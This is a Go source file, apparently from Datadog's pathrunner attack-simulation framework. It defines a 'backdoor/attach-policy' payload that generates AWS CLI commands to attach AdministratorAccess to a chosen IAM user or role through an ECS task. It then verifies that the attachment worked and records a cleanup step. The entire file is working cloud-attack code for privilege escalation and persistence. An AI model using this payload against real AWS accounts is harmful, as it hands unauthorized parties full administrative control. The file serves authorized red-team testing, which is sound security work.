// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ecs

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates container command arguments for an ECS task
// that attaches AdministratorAccess (or a custom policy) to a specified IAM principal.
// The task uses the amazon/aws-cli container image and invokes the AWS CLI directly.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an IAM user or role via ECS task container command"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceECS,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "ARN of policy to attach (default: AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode returns the AWS CLI subcommand arguments for the amazon/aws-cli container image.
// The image's entrypoint is `aws`, so we return just the subcommand and flags
// (e.g., "iam attach-user-policy --user-name foo --policy-arn bar").
// The module splits this into container command tokens.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	principalName, principalType := parsePrincipalARN(targetARN)
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	switch principalType {
	case "role":
		return fmt.Sprintf("iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn), nil
	default:
		// Default to user (parsePrincipalARN returns "user" for plain names too)
		return fmt.Sprintf("iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn), nil
	}
}

// ProcessResult passes through the module's result string.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// VerifySuccess checks whether the target principal has the attached policy.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	iamClient := iam.NewFromConfig(config)

	if principalType == "role" {
		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
			RoleName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	} else {
		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
			UserName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	}

	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
func parsePrincipalARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	return input, "user"
}
